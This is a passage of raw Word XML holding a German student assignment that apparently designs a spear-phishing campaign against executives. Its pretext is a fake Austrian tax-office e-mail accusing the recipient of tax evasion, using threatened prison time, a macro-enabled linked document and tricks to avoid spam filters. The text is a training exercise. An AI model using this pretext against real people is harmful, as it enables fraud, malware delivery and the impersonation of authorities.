    <w:p w14:paraId="677C1CF5" w14:textId="7D0587AE" w:rsidR="00481D06" w:rsidRPr="00B47CB9" w:rsidRDefault="00D2075D" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Die folgende Aufgabenstellung soll ein</w:t>
      </w:r>
      <w:r w:rsidR="00670B26">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A1423D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">überzeugende Spear Phishing Kampagne auf „Executive Mitarbeiter“ </w:t>
      </w:r>
      <w:r w:rsidR="00670B26">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>gestartet werden</w:t>
      </w:r>
      <w:r w:rsidR="00A1423D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Ich </w:t>
      </w:r>
      <w:r w:rsidR="00907FF6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">interpretiere den Begriff „Executive Mitarbeiter“ so, dass damit </w:t>
      </w:r>
      <w:r w:rsidR="00266CE8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Mitarbeiter wie (CEO, CFO, CTO, Vorstand) usw. und nicht „Ausführende Mitarbeiter“ im Sinne von Sekretärin, </w:t>
      </w:r>
      <w:r w:rsidR="006953A5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>IT-Administrator</w:t>
      </w:r>
      <w:r w:rsidR="00FC28BB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="006953A5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Büroangestellter</w:t>
      </w:r>
      <w:r w:rsidR="00670B26">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> gemeint sind</w:t>
      </w:r>
      <w:r w:rsidR="006953A5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F2BEC2D" w14:textId="0310741C" w:rsidR="006953A5" w:rsidRPr="00B47CB9" w:rsidRDefault="006953A5" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29431018" w14:textId="1006B6DF" w:rsidR="006953A5" w:rsidRPr="00B47CB9" w:rsidRDefault="006953A5" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Das ist insofern wichtig, da eine Spearphishing Kampagne exakt auf die </w:t>
      </w:r>
      <w:r w:rsidR="006C6AF1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Bezugsgruppe zugeschnitten werden muss. Ich persönlich habe beruflich die Erfahrung gemacht, dass „normale“ Mitarbeiter eher auf </w:t>
      </w:r>
      <w:r w:rsidR="00BD221A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidR="0070681E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>olgende Phishing Kampagnen reinfallen:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16661D4B" w14:textId="667E7C7E" w:rsidR="0070681E" w:rsidRPr="00B47CB9" w:rsidRDefault="0070681E" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D7ADB19" w14:textId="290A3BEB" w:rsidR="0070681E" w:rsidRPr="00B47CB9" w:rsidRDefault="0070681E" w:rsidP="00462682">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Spezielle Angebote für Mitarbeiter z. B. Black Friday (Übergabe Credentials im Browser)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758DC4BA" w14:textId="5F35734B" w:rsidR="003202DF" w:rsidRPr="00B47CB9" w:rsidRDefault="00243DDD" w:rsidP="00462682">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Aufruf z</w:t>
      </w:r>
      <w:r w:rsidR="003202DF" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>um Ändern der Zugangsdaten über Browser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2094EF2C" w14:textId="29272A3F" w:rsidR="003202DF" w:rsidRPr="00B47CB9" w:rsidRDefault="00462682" w:rsidP="00462682">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Download der neuen Email App zur verschlüsselten Kommunikation innerhalb der Firma</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8C7FD6" w14:textId="4EF75113" w:rsidR="00462682" w:rsidRPr="00B47CB9" w:rsidRDefault="00462682" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00EE1DCC" w14:textId="760B9940" w:rsidR="00462682" w:rsidRPr="00B47CB9" w:rsidRDefault="00462682" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Im Gegensatz dazu </w:t>
      </w:r>
      <w:r w:rsidR="00B73AF0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>fallen Geschäftsführende Mitarbeiter eher auf andere Phishing Angriffe herein:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360335F8" w14:textId="2740C5BC" w:rsidR="00B73AF0" w:rsidRPr="00B47CB9" w:rsidRDefault="00B73AF0" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AEE920A" w14:textId="627FCD1B" w:rsidR="00F76EFD" w:rsidRPr="00BD221A" w:rsidRDefault="00F76EFD" w:rsidP="00BD221A">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD221A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Freigabe von </w:t>
      </w:r>
      <w:r w:rsidR="00277759" w:rsidRPr="00BD221A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dringenden Zahlungsaufforderungen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEC70C7" w14:textId="6B25B828" w:rsidR="00277759" w:rsidRPr="00BD221A" w:rsidRDefault="00214D0C" w:rsidP="00BD221A">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD221A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anzeige vom </w:t>
      </w:r>
      <w:r w:rsidR="000B74BF" w:rsidRPr="00BD221A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Staatsanwalt wegen Straftatbestand</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2116CA13" w14:textId="75BD94EF" w:rsidR="000B74BF" w:rsidRPr="00BD221A" w:rsidRDefault="00284628" w:rsidP="00BD221A">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD221A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Bewerbung als Mitarbeiter für die ausgeschriebene Stelle als &lt;Stelle&gt; -&gt; HR Manager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05078D63" w14:textId="0DC7CC7C" w:rsidR="00284628" w:rsidRPr="00B47CB9" w:rsidRDefault="00284628" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44FC6965" w14:textId="40BE1A57" w:rsidR="00284628" w:rsidRPr="00B47CB9" w:rsidRDefault="00E64DEC" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich habe mir daher überlegt, auf welche </w:t>
      </w:r>
      <w:r w:rsidR="006163D1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Phishing Kampagne </w:t>
      </w:r>
      <w:r w:rsidR="00AC363A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">diese Personengruppe besonders sensitiv reagieren würde und </w:t>
      </w:r>
      <w:r w:rsidR="00A25062" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>habe mich daher für folgende Vorgehenswiese entscheiden:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58054CFA" w14:textId="5E66F6B3" w:rsidR="00A25062" w:rsidRPr="00B47CB9" w:rsidRDefault="00A25062" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57E52BE0" w14:textId="71BB6DA1" w:rsidR="00556D9E" w:rsidRPr="00B47CB9" w:rsidRDefault="00A25062" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der Empfänger enthält eine </w:t>
      </w:r>
      <w:r w:rsidR="002001B4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>E-Mail</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> vom Finanzamt und wird darauf hingewiesen, dass </w:t>
      </w:r>
      <w:r w:rsidR="002001B4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>beim letzten Steuerbescheid Unregelmäßigkeiten aufgetreten sind. Ihm</w:t>
      </w:r>
      <w:r w:rsidR="00872624">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002001B4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>/ Ihr</w:t>
      </w:r>
      <w:r w:rsidR="00872624">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (in diesem Fall Herrn Kaufmann)</w:t>
      </w:r>
      <w:r w:rsidR="002001B4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> wird der Strafbestand der Steuerhinterziehung vorgeworfen, </w:t>
      </w:r>
      <w:r w:rsidR="00614BE7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ein bereits ausgesendetes Schreiben wurde übersehen und es bleibt nur wenig Zeit </w:t>
      </w:r>
      <w:r w:rsidR="003038AC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">zum </w:t>
      </w:r>
      <w:r w:rsidR="001935C5">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r w:rsidR="001935C5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>andeln</w:t>
      </w:r>
      <w:r w:rsidR="00614BE7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Zeitdruck). </w:t>
      </w:r>
      <w:r w:rsidR="003038AC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der Empfänger </w:t>
      </w:r>
      <w:r w:rsidR="001935C5">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">wird </w:t>
      </w:r>
      <w:r w:rsidR="00833C27" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>auf die genaue</w:t>
      </w:r>
      <w:r w:rsidR="00A45C03" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>n Bereiche</w:t>
      </w:r>
      <w:r w:rsidR="001935C5">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> innerhalb des Steuerbescheids</w:t>
      </w:r>
      <w:r w:rsidR="00A45C03" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> hingewiesen, gegen welche er falsche Angaben gemacht hat (e.g. </w:t>
      </w:r>
      <w:r w:rsidR="006B6947" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Einkommen aus gewerblicher Tätigkeit, </w:t>
      </w:r>
      <w:r w:rsidR="00C75637">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="006B6947" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">onstige Sachbezüge). Anschließend habe ich mir von </w:t>
      </w:r>
      <w:r w:rsidR="004F675F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">einer Rechtsanwalts Seite </w:t>
      </w:r>
      <w:r w:rsidR="00817A44" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:history="1">
        <w:r w:rsidR="00817A44" w:rsidRPr="00B47CB9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>https://rechtsanwaelte-wirtschaftsstrafrecht-berlin.de/der-tatbestand-der-steuerhinterziehung/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00817A44" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">) ein </w:t>
      </w:r>
      <w:r w:rsidR="00C75637" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>paar</w:t>
      </w:r>
      <w:r w:rsidR="00817A44" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sätze herausgesucht, welche im Zusammenhang </w:t>
      </w:r>
      <w:r w:rsidR="00985EA2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mit Steuerhinterziehung steh</w:t>
      </w:r>
      <w:r w:rsidR="00C75637">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:r w:rsidR="00985EA2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Der Empfänger soll somit darauf hingewiesen werden, dass er </w:t>
      </w:r>
      <w:r w:rsidR="007A4E80" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>aus gesetzlichen Gründen dazu verpflichtet ist richtige Angaben</w:t>
      </w:r>
      <w:r w:rsidR="00C75637">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009F0EB2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>zu</w:t>
      </w:r>
      <w:r w:rsidR="007A4E80" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> machen</w:t>
      </w:r>
      <w:r w:rsidR="00C92F5C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Anschließend </w:t>
      </w:r>
      <w:r w:rsidR="00C92F5C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">wir der Empfänger darauf hingewiesen, welche </w:t>
      </w:r>
      <w:r w:rsidR="009F0EB2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Konsequenzen,</w:t>
      </w:r>
      <w:r w:rsidR="00C92F5C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> dass für </w:t>
      </w:r>
      <w:r w:rsidR="009F0EB2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="00C92F5C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>hn haben könnte (</w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:history="1">
        <w:r w:rsidR="008C1F9D" w:rsidRPr="00B47CB9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>https://dejure.org/gesetze/AO/370.html</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="008C1F9D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">). Um dies möglich realistisch gestalten zu können </w:t>
      </w:r>
      <w:r w:rsidR="00A3645B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">wurde </w:t>
      </w:r>
      <w:r w:rsidR="006C2FFD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ein direkter Auszug</w:t>
      </w:r>
      <w:r w:rsidR="00A3645B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> aus dem Abgabenordnungsgesetz verwendet. Für den Empfänger soll besonders </w:t>
      </w:r>
      <w:r w:rsidR="006C2FFD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">kritisch sein, dass hierbei eine Freiheitsstrafe bis zu 10 Jahre </w:t>
      </w:r>
      <w:r w:rsidR="005A3C3D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>vorgesehen ist. Abschließend erhält der Empfänger einen Link zur Anwendung</w:t>
      </w:r>
      <w:r w:rsidR="00A06D99" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Dort kann er über eine </w:t>
      </w:r>
      <w:r w:rsidR="00E006FF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>„</w:t>
      </w:r>
      <w:r w:rsidR="00A06D99" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>sichere Verbindung</w:t>
      </w:r>
      <w:r w:rsidR="00E006FF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="00A06D99" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001475E2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">auf die Vorwürfe zugreifen und eine Erklärung abgeben. Zusätzlich </w:t>
      </w:r>
      <w:r w:rsidR="005F6DDD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wird erwähnt</w:t>
      </w:r>
      <w:r w:rsidR="00CF2015" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="005F6DDD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> dass er die Makros aktivieren muss, da er sonst seine Meldung nicht abgeben kann, wozu er verpflichtet ist.</w:t>
      </w:r>
      <w:r w:rsidR="00D45C5A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ich habe mich dazu entschieden das Dokument nicht direkt in den Anhang zu packen, da ich </w:t>
      </w:r>
      <w:r w:rsidR="00410BFE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">eine </w:t>
      </w:r>
      <w:r w:rsidR="00D45C5A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">mögliche </w:t>
      </w:r>
      <w:r w:rsidR="00410BFE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Erkennung durch beispielsweise Spamfilter vermeiden will. </w:t>
      </w:r>
      <w:r w:rsidR="00B17127" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">In der Signatur befindet sich </w:t>
      </w:r>
      <w:r w:rsidR="005423C4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">eine </w:t>
      </w:r>
      <w:r w:rsidR="00B17127" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">echte Anschrift des </w:t>
      </w:r>
      <w:r w:rsidR="005423C4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>BMF in Wien inklusive dem Originallogo</w:t>
      </w:r>
      <w:r w:rsidR="009660CE">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (schätze mal, das geht für die Vorlesung in Ordnung)</w:t>
      </w:r>
      <w:r w:rsidR="005423C4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EFD7087" w14:textId="77777777" w:rsidR="00556D9E" w:rsidRPr="00B47CB9" w:rsidRDefault="00556D9E" w:rsidP="00556D9E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2861E791" w14:textId="24D9ED73" w:rsidR="00556D9E" w:rsidRPr="00B47CB9" w:rsidRDefault="00556D9E" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Um die Spear Phishing Kampagne möglichst authentisch gestalten zu können wurde folgende E-Mail gestaltet:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4B723A" w14:textId="77777777" w:rsidR="005423C4" w:rsidRPr="00B47CB9" w:rsidRDefault="005423C4" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22CD2B32" w14:textId="7A698338" w:rsidR="00AC363A" w:rsidRPr="00B47CB9" w:rsidRDefault="00B17127" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3CDBFD32" wp14:editId="63E468FB">
            <wp:extent cx="5759450" cy="3483610"/>
            <wp:effectExtent l="0" t="0" r="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3483610"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C276BFF" w14:textId="62579664" w:rsidR="00E3080D" w:rsidRPr="00B47CB9" w:rsidRDefault="00E3080D" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5531585D" w14:textId="48773FE9" w:rsidR="005423C4" w:rsidRPr="00B47CB9" w:rsidRDefault="005423C4" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Anschließend habe ich nach einer Domain gesucht, welche möglichst authentisch ist.</w:t>
      </w:r>
      <w:r w:rsidR="00F43F4F" w:rsidRPr="00B47CB9">
        <w:rPr>
